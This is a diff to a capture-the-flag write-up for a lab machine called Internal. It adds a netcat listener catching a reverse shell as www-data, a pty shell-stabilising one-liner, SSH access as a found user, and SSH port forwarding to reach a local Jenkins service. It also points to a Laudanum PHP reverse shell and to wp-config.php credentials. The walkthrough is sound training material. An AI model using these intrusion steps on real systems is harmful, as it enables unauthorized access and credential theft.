@@ -285,19 +285,36 @@ Copy and adapt the Laudanum PHP Reverse Shell found in `/usr/share/laudanum/php/
 
 A shell as the `www-data` user is granted on the box.
 
+```text
+$ nc -lvn 1234           
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.239.250.
+Ncat: Connection from 10.10.239.250:58570.
+Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 01:44:47 up  1:05,  0 users,  load average: 0.00, 0.00, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+```
+
 Stabilise the shell:
 
     python -c "import pty;pty.spawn('/bin/bash')"
+
+Explore to find an interesting file in the `/opt` directory. Read it.
+The user flag is in aubreanna’s home folder. 
 
 ## Privilege escalation
 
 MySQL credentials can often be found by inspecting the `wp-config.php` file. Alas.
 
-Explore to find an interesting file in the `/opt` directory. Read it.
+Log in as the aubreanna user via SSH:
 
-    su aubreanna
+    ssh aubreanna@internal.thm
 
-The user flag is in aubreanna’s home folder. 
+Check for sudo privileges:
 
     sudo -l
     Sorry, user aubreanna may not run sudo on internal.
@@ -312,11 +329,29 @@ If not a rabbit hole, this could be a way to elevate privileges to root.
 ## Using SSH for port forwarding
 
 Because port 8080 can only be accessed locally, we need to set up port forwarding to redirect traffic to localhost 
-on port 1234 to the target machine on port 8080:
+on port 1234 to the target machine on port 8080. On the attack machine:
 
 ```text
-$ ssh -f -N -L 1234:127.0.0.1:8080 aubreanna@<IP target>
-$ nmap -sC -sV -p 1234 127.0.0.1
+$ ssh -f -N -L 1234:127.0.0.1:8080 aubreanna@internal.thm
+aubreanna@internal.thm's password: 
+```
+
+Check results:
+```text
+$ nmap -sC -sV -p 1234 127.0.0.1                         
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-03 03:14 BST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00011s latency).
+
+PORT     STATE SERVICE VERSION
+1234/tcp open  http    Jetty 9.4.30.v20200611
+|_http-server-header: Jetty(9.4.30.v20200611)
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.51 seconds
 ```
 
 Jenkins is now available on `127.0.0.1:1234/login?from=%2F` from the attack machine.
